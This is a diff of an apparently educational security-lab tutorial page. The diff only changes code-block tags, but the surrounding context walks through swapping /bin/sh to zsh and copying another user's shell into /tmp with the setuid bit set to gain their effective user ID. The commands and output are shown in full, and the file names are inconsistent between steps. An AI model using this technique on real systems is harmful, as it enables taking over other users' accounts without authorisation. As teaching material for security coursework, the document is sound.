@@ -22,7 +22,7 @@ a good choice of shell to use when attempting to stealing someones shell.
 
 #### Check your default shell
 
-```bash
+```bash +torchlight-bash
 ls -l /bin/sh
 # output
 lrwxrwxrwx 1 root root 4 Jul 11  2022 /bin/sh -> dash
@@ -30,14 +30,14 @@ lrwxrwxrwx 1 root root 4 Jul 11  2022 /bin/sh -> dash
 
 #### Remove the symlink of your default which points to `dash` and recreate pointing to `zsh`
 
-```bash
+```bash +torchlight-bash
 sudo rm /bin/sh
 sudo ln -s /bin/zsh /bin/sh
 ```
 
 #### Confirm shell has been updated
 
-```bash
+```bash +torchlight-bash
 ls -l /bin/sh
 # output
 lrwxrwxrwx 1 root root 8 Mar 23 07:24 /bin/sh -> /bin/zsh
@@ -48,7 +48,7 @@ lrwxrwxrwx 1 root root 8 Mar 23 07:24 /bin/sh -> /bin/zsh
 This example assumes there is a user called Jane already set up, so rather than jumping on a
 physical machine you are just switching user.
 
-```bash
+```bash +torchlight-bash
 # switch user
 su jane
 # copy janes shell to the tmp directory
@@ -59,7 +59,7 @@ chmod 4755 /tmp/janesStolenShell
 
 #### Make sure `set-uid` bit has been enabled
 
-```bash
+```bash +torchlight-bash
 ls -l /tmp/janesStolenShell
 # updated permissions
 -rwsr-xr-x 1 jane jane 878288 Mar 24 05:10 /tmp/janesStolenShell
@@ -67,7 +67,7 @@ ls -l /tmp/janesStolenShell
 
 #### Return back to your computer and access the stolen shell
 
-```bash
+```bash +torchlight-bash
 sudo chown user_name /tmp/janesShell
 # confirm the job
 /tmp/janesShell
@@ -78,7 +78,7 @@ $
 You can confirm you have successfully stolen the shell by running  `id` command. If the `euid` is
 set to the stolen shells user id then you have successfully stolen their shell.
 
-```bash
+```bash +torchlight-bash
 id
 # output
 uid=1000(seed) gid=1000(seed) euid=1001(jane) groups=1000(seed),120(docker)
